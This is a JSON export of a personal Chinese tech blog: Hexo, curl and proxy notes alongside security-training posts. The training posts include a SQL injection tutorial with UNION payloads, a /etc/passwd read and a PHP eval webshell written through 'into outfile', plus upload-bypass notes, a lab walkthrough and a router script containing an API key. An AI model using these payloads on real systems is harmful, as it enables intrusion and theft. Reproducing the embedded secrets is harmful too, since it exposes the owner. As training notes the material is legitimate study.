{"meta":{"title":"sti1l's blog","subtitle":"sti1l的个人博客","description":"","author":"sti1l","url":"http://blog.sti1l.top","root":"/"},"pages":[{"title":"about","date":"2021-08-10T05:20:05.000Z","updated":"2021-08-10T05:22:16.560Z","comments":true,"path":"about/index.html","permalink":"http://blog.sti1l.top/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-08-10T05:19:53.000Z","updated":"2021-08-10T05:22:18.013Z","comments":true,"path":"categories/index.html","permalink":"http://blog.sti1l.top/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-08-10T05:20:14.000Z","updated":"2021-08-10T05:22:14.886Z","comments":true,"path":"friends/index.html","permalink":"http://blog.sti1l.top/friends/index.html","excerpt":"","text":""},{"title":"404","date":"2021-08-10T05:22:32.000Z","updated":"2021-08-10T05:22:48.156Z","comments":true,"path":"404/index.html","permalink":"http://blog.sti1l.top/404/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-08-10T05:20:00.000Z","updated":"2021-08-10T05:22:17.140Z","comments":true,"path":"tags/index.html","permalink":"http://blog.sti1l.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Hexo图片宽度调整","slug":"hexo-img","date":"2021-08-10T09:49:02.000Z","updated":"2021-08-10T10:33:56.379Z","comments":true,"path":"2021/08/10/hexo-img/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/hexo-img/","excerpt":"","text":"Hexo图片宽度调整Hexo在解析md文件里的图片内容时，只将图片的url或地址直白地转换为html语法中的img标签，而没有对图片宽度做限制。当上传图片大小大于Hexo模板的文本容器宽度时，会使得图片超出容器外，破坏网页美观。 简单试验后发现，在生成的html文件内，对图片img标签加入style=”max-width: “属性可以限制图片宽度。于是尝试修改Hexo模板引擎。 模板引擎的作用，就是将界面与数据分离。最简单的原理是将模板内容中指定的地方替换成数据，实现业务代码与逻辑代码分离。数据的填充主要是 hexo -g 的时候将数据(.md文件)传递给 ejs 模板，然后再由 ejs 模板填充到 HTML 中。 因此可以有以下几种方法修改图片的大小： 修改ejs模板中对img标签的处理，将图像的宽度限制记录在html中。 修改主题对应的js / css，由浏览器渲染调整图像大小。 尝试在js和css中添加宽度限制 使用jQurey为图像添加类和样式–&gt;失败 在matery主题中，作者使用了js文件对文章内容做初始化。修改响应js代码。因此可以借助jQuery设置元素的相关属性。 $('#articleContent img').each(function () { let imgPath = $(this).attr('src'); $(this).wrap('&lt;div class=\"img-item\" data-src=\"' + imgPath + '\" data-sub-html=\".caption\"&gt;&lt;/div&gt;'); //图片限制大小 $(this).css('max-width','98%') // 图片添加阴影 $(this).addClass(\"img-shadow img-margin img-width\"); 代码的第5行为图片添加了不大于上层容器宽度98%的限制，采用max-width可以让原本低分辨率的图像保持正常大小显示。此外应该还有很多方式可以限制图片宽度，这里只使用了其中一种。 这里只测试了markdown使用url引入图片的方式，理论上对于本地引入同样适用。 修改前的图片： 修改后的图片： 修改ejs模板我用的这款主题不是用ejs模板，而是使用js的方式添加图片的。也可能我对ejs的作用理解有误吧。总之这里就先摆烂不写了。 梳理基于Hexo搭建博客的原理 | 小贪心 (littlezero.top)","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://blog.sti1l.top/tags/hexo/"},{"name":"javascript","slug":"javascript","permalink":"http://blog.sti1l.top/tags/javascript/"}]},{"title":"实训第三天文件包含","slug":"file_include","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T08:08:22.572Z","comments":true,"path":"2021/08/10/file-include/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/file-include/","excerpt":"","text":"php文件包含，只包含一次 include_once(file) 可以反复包含 include(file) 返回文件指针 fopen(file) 读取到缓冲区、返回整数为文件长度 readfile(file) 文件包含函数不经过过滤，动态包含文件，存在文件包含漏洞 本地文件包含(LFI,local file include) 被包含文件需要在同一目录下 若不在同一目录，需要用相对或绝对路径 被包含页面后缀无论是什么，都会被当作php解析 include和require的区别：包含的文件不存在时，都会爆出绝对路径，但include后的命令会继续执行，require后的命令会停止执行。 对于后缀名限制，在php5.5一下版本可以使用%00截断字符 远程文件包含(RFI)属于代码注入 当phpinfo中的url_fopen或url_include为on状态时，可以使用这两个函数来包含远程文件。","categories":[],"tags":[{"name":"四叶草实训","slug":"四叶草实训","permalink":"http://blog.sti1l.top/tags/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%9E%E8%AE%AD/"},{"name":"渗透","slug":"渗透","permalink":"http://blog.sti1l.top/tags/%E6%B8%97%E9%80%8F/"},{"name":"文件包含","slug":"文件包含","permalink":"http://blog.sti1l.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"一些curl参数","slug":"curl手册","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T07:52:25.244Z","comments":true,"path":"2021/08/10/curl-shou-ce/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/curl-shou-ce/","excerpt":"","text":"-i显示响应头和html -I只显示响应头 -v显示端口连接过程和请求头 –trace / -v更加详细，可以调试 -X / -x指定发送方法，如post curl -X POST --data \"data=xxx\" example.com/form.cgi -u指定用户名和密码，转换为请求中的Authorization -G构造url查询，GET请求 -k跳过ssl –form / -F文件上传 –user-agent / –cookie / –header / –referer分别等价于 -A / -b / -H / -e提供对应的信息 -c将服务器提供的cookie写入文件 -d / –data / –data-urlencode发送post数据体，需要和-X POST一起用，最后一个还可以编码 -s不输出错误和进度信息 -o / -O保存成文件，小写的-o需要额外指定文件名，大写的使用原文件名","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://blog.sti1l.top/tags/linux/"},{"name":"curl","slug":"curl","permalink":"http://blog.sti1l.top/tags/curl/"}]},{"title":"实训第三天","slug":"file_upload","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T08:08:09.254Z","comments":true,"path":"2021/08/10/file-upload/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/file-upload/","excerpt":"","text":"直接上传前端绕过 禁用js，使前端验证失效 通过修改正常的请求或者重发，直接和后端交互，绕过前端 后端content type校验 通过修改Content type绕过后端对文件类型的验证 抓包修改后缀名 后端黑名单校验 修改php5、php3等其他可执行后缀名 大小写 .pHP、.PHP等 .htaccess(apache配置文件) 双写后缀名","categories":[],"tags":[{"name":"四叶草实训","slug":"四叶草实训","permalink":"http://blog.sti1l.top/tags/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%9E%E8%AE%AD/"},{"name":"渗透","slug":"渗透","permalink":"http://blog.sti1l.top/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"路由开机脚本配置","slug":"ip__","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T07:52:39.860Z","comments":true,"path":"2021/08/10/ip/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/ip/","excerpt":"","text":"##R7000 boot script # ip ip=$(ifconfig -a|grep 10.170|awk '{print $2}'|tr -d \"addr:\") bark='https://api.day.app/Jmu8WBAjx7CDtKpidsQnzW/' group='?group=ip' curl $bark$ip$group # aria2 /koolshare/aria2/aria2c --conf-path=/koolshare/aria2/aria2.conf -D # frp /koolshare/bin/frpc_linux_arm_garbage -f 2n6flw9stmhzj451:1061057,1061049","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://blog.sti1l.top/tags/linux/"},{"name":"shell","slug":"shell","permalink":"http://blog.sti1l.top/tags/shell/"}]},{"title":"win/unix等环境下代理的设置","slug":"proxy","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T07:53:00.071Z","comments":true,"path":"2021/08/10/proxy/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/proxy/","excerpt":"","text":"powershell proxyset http_proxy=socks5://127.0.0.1:8848 set https_proxy=socks5://127.0.0.1:8848 linuxexport http_proxy=socks5://127.0.0.1:8848 export https_proxy=socks5://127.0.0.1:8848 gitgit config --global https.proxy http://127.0.0.1:1080 git config --global https.proxy https://127.0.0.1:1080 # unset_proxy git config --global --unset http.proxy git config --global --unset https.proxy","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"http://blog.sti1l.top/tags/shell/"},{"name":"代理","slug":"代理","permalink":"http://blog.sti1l.top/tags/%E4%BB%A3%E7%90%86/"}]},{"title":"常用软件源","slug":"set-source","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T08:11:49.951Z","comments":true,"path":"2021/08/10/set-source/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/set-source/","excerpt":"","text":"python清华源pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 阿里源pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/ 腾讯源pip config set global.index-url http://mirrors.cloud.tencent.com/pypi/simple 豆瓣源pip config set global.index-url http://pypi.douban.com/simple/ opkg清华sed -i 's_downloads.openwrt.org_mirrors.tuna.tsinghua.edu.cn/openwrt_' /etc/opkg/distfeeds.conf","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"http://blog.sti1l.top/tags/shell/"}]},{"title":"记一次kali网卡修复","slug":"kali_eth","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T07:52:01.745Z","comments":true,"path":"2021/08/10/kali-eth/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/kali-eth/","excerpt":"","text":"查看网卡信息 ifconfig -a 修改/etc/network/interfaces加入 auto eth0 iface eth0 inet dhcp","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"http://blog.sti1l.top/tags/shell/"},{"name":"kali","slug":"kali","permalink":"http://blog.sti1l.top/tags/kali/"}]},{"title":"佳作赏析","slug":"原偷","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T07:51:50.126Z","comments":true,"path":"2021/08/10/yuan-tou/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/yuan-tou/","excerpt":"","text":"windows文件系统比较 Windows 上四种不同的文件（夹）链接方式（NTFS 的硬链接、目录联接、符号链接，和大家熟知的快捷方式） - walterlv","categories":[],"tags":[{"name":"原偷","slug":"原偷","permalink":"http://blog.sti1l.top/tags/%E5%8E%9F%E5%81%B7/"}]},{"title":"实训第二天笔记","slug":"sql_inject","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T07:56:52.791Z","comments":true,"path":"2021/08/10/sql-inject/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/sql-inject/","excerpt":"","text":"获取数据库数据1. 寻找注入点利用引号、括号等构造闭合，判断是否存在注入点。也可能没有保护，不需要构造闭合。 可以用#和–+来构造注释 2. 判断是否存在注入在闭合后的语句中插入1=1，查看该位置语句是否被运算 3. 判断当前表有多少列利用order by ($数字) 来判断总共有多少列 闭合后语句如下 select * from users where id='1' order by 3#'limit 0,1; 4. 判断显示位借助union连接查询语句将前半部分的查询(实际上为空)和后半部分语句拼接。因为前半部分为空，所以实际会显示后半部分中的内容。因此可以看到实际上选择了id表中的哪几列。 select * from users where id='-1' union select 1,2,3#'limit 0,1; 2，3 4.1 报错注入当注入点位于登录框时，可能没有显示位但是能显示错误信息，此时可以使用报错注入。mysql从5.1.5版本开始提供xml查询和修改函数。extractvalue和updatexml。 UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 。 第二个参数要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。因此我们可以故意使它报错，将查询信息显示出来。 5. 查询数据库名select * from users where id='-1' union select 1,user(),database()#'limit 0,1; @localhost，security 6. 查询数据库表名在mysql5.0以上版本，默认有三个库：mysql、information_schema、performance_schema。infomation_schema中会记录库中的表名 用户被存储在user表中 SCHEMATA中存储了mysql的所有库名 TABLES中存储了所有的表名 COLUMNS中存储了所有的列名 借助一些语句，可以选择查看表中的某一项 借助limit语句，可以限制查看第几个数据 借助group_concat，将多个表拼接在一起返回 查询单个表名 select * from users where id='-1' union select 1,user(),table_name from information_schema.tables where table_schema=\"security\" limit 3,3; 查询所有表名 select * from users where id='-1' union select 1,user(),group_concat(table_name) from information_schema.columns where table_schema=\"security\"#'limit 0,1; emails,referers,uagents,users 7. 查询某个表的所有列名select * from users where id='-1' union select 1,user(),group_concat(column_name) from information_schema.columns where table_schema=\"security\" and table_name=\"users\"#'limit 0,1; id,username,password 8. 查询表中的数据select * from users where id='-1' union select 1,user(),group_concat(id,username,password ) from security.users#'limit 0,1; 1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4 获取服务器数据1. 判断服务器类型linux服务器区分大小写，windows服务器不区分大小写因此构造 select * from users where iD='-1' 报错说明是linux 2. 通过load_file函数读取服务器文件select * from users where id=-1 union select 1,2,load_file('/etc/passwd') 获取服务器权限利用into outfile将程序输出导出到文件 select * from users where id=-1 union select 1,2,'&lt;?php eval($_POST[1]);?&gt;' into outfile '/var/www/html/666.php'%23","categories":[],"tags":[{"name":"四叶草实训","slug":"四叶草实训","permalink":"http://blog.sti1l.top/tags/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%9E%E8%AE%AD/"},{"name":"渗透","slug":"渗透","permalink":"http://blog.sti1l.top/tags/%E6%B8%97%E9%80%8F/"},{"name":"sql注入","slug":"sql注入","permalink":"http://blog.sti1l.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"lua语法记录","slug":"lua","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T07:51:14.420Z","comments":true,"path":"2021/08/10/lua/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/lua/","excerpt":"","text":"引入包json = require \"json\" 可用的json实例{\"config_version\":\"0.36\",\"uri_rewrite_rule\":[],\"summary_request_enable\":true,\"dashboard_host\":\"\",\"redirect_enable\":false,\"cookie_prefix\":\"verynginx\",\"readonly\":false,\"proxy_pass_rule\":[],\"proxy_pass_enable\":false,\"frequency_limit_enable\":false,\"filter_rule\":[],\"summary_with_host\":true,\"browser_verify_rule\":[],\"browser_verify_enable\":false,\"static_file_enable\":false,\"scheme_lock_rule\":[],\"summary_group_temporary_enable\":true,\"backend_upstream\":{},\"summary_collect_rule\":[],\"redirect_rule\":[],\"matcher\":{\"arg_list\":{\"Args\":[{\"name_value\":\"arg1\",\"name_operator\":\"=\",\"value\":\"v1\",\"operator\":\"≈\"},{\"name_value\":\"arg2\",\"name_operator\":\"=\",\"value\":\"v2\",\"operator\":\"≈\"}]}},\"filter_enable\":true,\"summary_group_persistent_enable\":true,\"response\":{},\"summary_temporary_period\":60,\"frequency_limit_rule\":[],\"admin\":[{\"password\":\"verynginx\",\"enable\":true,\"user\":\"verynginx\"},{\"password\":\"11511\",\"enable\":false,\"user\":\"11511\"}],\"static_file_rule\":[],\"mail\":\"${mail}\",\"scheme_lock_enable\":false,\"uri_rewrite_enable\":false,\"base_uri\":\"/verynginx\"} json.encode(table) json.decode(str) 获得table的长度#table 注意lua中table的索引是从1开始的 遍历一个列表型tablefor i = 1,#table do print(json.encode( i )) end 遍历一个字典型tablefor k, v in pairs table do print(k,v) end 取类型if type(table)=='table' then print('a') else print('b') end &gt;&gt;&gt;table","categories":[],"tags":[{"name":"lua","slug":"lua","permalink":"http://blog.sti1l.top/tags/lua/"},{"name":"verynginx","slug":"verynginx","permalink":"http://blog.sti1l.top/tags/verynginx/"}]},{"title":"实训第十天wp","slug":"实习第十天","date":"2021-08-10T07:36:35.000Z","updated":"2021-08-10T08:35:52.106Z","comments":true,"path":"2021/08/10/shi-xi-di-shi-tian/","link":"","permalink":"http://blog.sti1l.top/2021/08/10/shi-xi-di-shi-tian/","excerpt":"","text":"whatweb查询网页cms 修改返回的js，绕过前端验证上传头像 抓包得到头像上传url上传url为：http://116.62.203.33:84/index.php?ctl=avatar&amp;act=upload&amp;uid=2004，缺少验证。可以给任意用户上传并覆盖头像。 管理员账号泄漏对比可知其中一个管理员账户为admin 积分商场sql注入圣代千行科技 用sqlmap跑出来纯在时间盲注 同时发现数据库中存储了管理员密码admin1233321 后台登录xss在后台编辑文章后存在xss 担保机构页面文件上传担保机构页面有文件上传，没有任何过滤 传上来可以直接连接 可以看到mysql账号的密码 第二题flag1提示需要本地打开在http header里添加X-Forwarded-For: 127.0.0.1，使用burp的修改功能在每一个包前面都加上 构造后的包头如下 成功登录，得到flag1:{b59c67bf196a4758191e42f76670ceba} flag2扫描发现根目录下存在/flag.txt文件，打开得到flag2:{a8009e4841bd24d57201ad20667f3c4b} flag3来到注册页面，注册一个名为admin的账户点击profile，发现是修改密码页面，地址为http://1.14.140.145:81/index.php?page=profile&amp;user_id=15。可以把链接改为http://1.14.140.145:81/index.php?page=profile&amp;user_id=1，发现可以访问，说明页面存在水平越权。遍历发现flag3 打开源码发现被隐藏的部分，得到flag{ 934b535800b1cba8f96a5d72f72f1611} flag4对修改框做sql注入，得到flag4并且获得ssh的用户名和密码 flag5提权看flag5里的内容，得到flag{yunyansec}","categories":[],"tags":[{"name":"四叶草实训","slug":"四叶草实训","permalink":"http://blog.sti1l.top/tags/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%9E%E8%AE%AD/"},{"name":"渗透","slug":"渗透","permalink":"http://blog.sti1l.top/tags/%E6%B8%97%E9%80%8F/"}]}],"categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://blog.sti1l.top/tags/hexo/"},{"name":"javascript","slug":"javascript","permalink":"http://blog.sti1l.top/tags/javascript/"},{"name":"四叶草实训","slug":"四叶草实训","permalink":"http://blog.sti1l.top/tags/%E5%9B%9B%E5%8F%B6%E8%8D%89%E5%AE%9E%E8%AE%AD/"},{"name":"渗透","slug":"渗透","permalink":"http://blog.sti1l.top/tags/%E6%B8%97%E9%80%8F/"},{"name":"文件包含","slug":"文件包含","permalink":"http://blog.sti1l.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"linux","slug":"linux","permalink":"http://blog.sti1l.top/tags/linux/"},{"name":"curl","slug":"curl","permalink":"http://blog.sti1l.top/tags/curl/"},{"name":"shell","slug":"shell","permalink":"http://blog.sti1l.top/tags/shell/"},{"name":"代理","slug":"代理","permalink":"http://blog.sti1l.top/tags/%E4%BB%A3%E7%90%86/"},{"name":"kali","slug":"kali","permalink":"http://blog.sti1l.top/tags/kali/"},{"name":"原偷","slug":"原偷","permalink":"http://blog.sti1l.top/tags/%E5%8E%9F%E5%81%B7/"},{"name":"sql注入","slug":"sql注入","permalink":"http://blog.sti1l.top/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"lua","slug":"lua","permalink":"http://blog.sti1l.top/tags/lua/"},{"name":"verynginx","slug":"verynginx","permalink":"http://blog.sti1l.top/tags/verynginx/"}]}